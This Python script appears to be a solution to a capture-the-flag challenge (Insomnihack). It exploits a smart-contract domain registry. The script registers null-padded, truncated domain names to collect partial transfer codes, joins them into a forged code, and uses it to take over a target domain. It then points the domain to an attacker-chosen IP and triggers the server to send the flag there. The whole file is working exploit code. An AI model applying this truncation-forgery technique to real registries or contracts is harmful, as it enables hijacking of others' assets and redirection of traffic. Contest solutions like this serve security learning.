from web3 import Web3
from web3.middleware import construct_sign_and_send_raw_middleware

import os
import json
import requests

import settings



# Initialize RPC connection and user account
W3 = Web3(Web3.HTTPProvider(settings.RPC_URL))
ACCOUNT = W3.eth.account.from_key(settings.PRIVATE_KEY)
W3.eth.default_account = ACCOUNT.address
# Use account as signer for transactions
W3.middleware_onion.add(construct_sign_and_send_raw_middleware(ACCOUNT))

# Cookies to interact with the webserver
COOKIES = {"session": settings.SESSION}

# Initialize smart contract object
with open("domain_abi.json", "rb") as f:
    domain_abi = json.loads(f.read())
DOMAIN_CONTRACT = W3.eth.contract(address=settings.MAIN_CONTRACT_ADDRESS, abi=domain_abi)

def gen_trans_code(domain_name_part, pos):
    """
    Do the appropriate smart contract and webserver calls to generate the transfer code part
    with position pos associated with the domain_name_part. Return the transfer code part.
    """
    # Generate domain name that would be truncated
    # Add a bit of randomness after truncation to avoid error registering already registered domain
    suffix = pos.to_bytes(1, "little").decode()
    payload_domain_name = f"{domain_name_part}{suffix}"
    # Pad with zero + random
    payload_domain_name += (32 - len(payload_domain_name)) * "\x00" + os.urandom(6).hex()

    # Call the smart contract
    tx = DOMAIN_CONTRACT.functions.registerInsoDomain(payload_domain_name, "aa").transact({"value": W3.to_wei(1, 'ether')})
    W3.eth.wait_for_transaction_receipt(tx)

    # The ".inso" suffix is added by the smart contract when registering
    full_domain_name = payload_domain_name + ".inso"

    # Check that the registration went well.
    assert DOMAIN_CONTRACT.functions.getDomainOwner(full_domain_name).call() == ACCOUNT.address

    # Initiate transfer to trigger transfer code generation on the webserver side
    tx = DOMAIN_CONTRACT.functions.initiateTransfer(full_domain_name, ACCOUNT.address).transact()
    W3.eth.wait_for_transaction_receipt(tx)

    # Retrieve transfer code from the webserver side
    # Could have used the more specific route defined in the webserver.
    r = requests.get("https://unnamed.insomnihack.ch/transfer-codes", cookies=COOKIES)

    for tr in r.json():
        if tr["domain"] == full_domain_name:
            res = bytes.fromhex(tr["code"])[:65]
            return res

    raise Exception("Transfer codes not found, something went wrong.")

def transfer_check_ip(domain_name, ip, trans_code):
    """
    Actually transfer the domain name and set the resolving ip.
    """
    # Call the smart contract to transfer the domain.
    tx = DOMAIN_CONTRACT.functions.transferDomain(domain_name, ip , trans_code).transact()
    W3.eth.wait_for_transaction_receipt(tx)

    # Wait for the change to take effect.
    print("Waiting...", end='')
    while DOMAIN_CONTRACT.functions.resolveIp(domain_name).call() != ip:
        print(end='.')
        pass
    print()


if __name__ == "__main__":
    domain_name_array = settings.TARGET_DOMAIN_NAME.split('.')
    trans_code = "0x"
    for i, domain_name_part in enumerate(domain_name_array):
        pos = len(domain_name_array) - i
        print(f"Generate transfer code for {domain_name_part} at position {pos}...")
        trans_code += gen_trans_code(domain_name_part, pos).hex()

    print(f"Transfer the target domain name {settings.TARGET_DOMAIN_NAME} and associate ip {settings.TARGET_IP}...")
    transfer_check_ip(settings.TARGET_DOMAIN_NAME, settings.TARGET_IP, trans_code)

    # Instruct webserver to send flag.
    # Be sure that settings.TARGET_IP is listening to the right port (default to 80)
    print("Sending flag...")
    r = requests.post("https://unnamed.insomnihack.ch/send-flag", cookies=COOKIES)